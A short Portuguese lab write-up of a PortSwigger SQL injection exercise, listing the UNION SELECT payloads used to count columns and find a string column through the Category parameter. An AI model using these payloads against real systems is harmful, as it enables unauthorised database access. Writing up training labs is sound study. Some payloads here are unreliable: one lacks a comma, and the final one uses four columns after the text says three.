# Web-Security-Writeups - PortSwigger SQLi Labs

## Lab 4: SQL Injection UNION attack, finding a column containing

**Objetivo:** Descobrir o número total de colunas e qual é o tipo de dado que ela contém através do filtro de categoria.

**Vulnerabilidade encontrada:**
no parâmetro `?Category=` estava concatenando direto no SQL. Ao injetar `'` deu erro 500.

**Meu processo:**
1. Descobri o número de colunas com `'+UNION+SELECT+NULL,NULL,NULL--` são 3 colunas.
2. Testei o tipo de dado string para achar a coluna `'+UNION+SELECT+'2Kz0yr',NULL,NULL--`,`'+UNION+SELECT+NULL,'2Kz0yr',NULL--` e `'+UNION+SELECT+NULL,NULL'2Kz0yr'--`.

**Payload final:**
```sql
'+UNION+SELECT+NULL,NULL,NULL,NULL--
'+UNION+SELECT+NULL,'2Kz0yr',NULL--
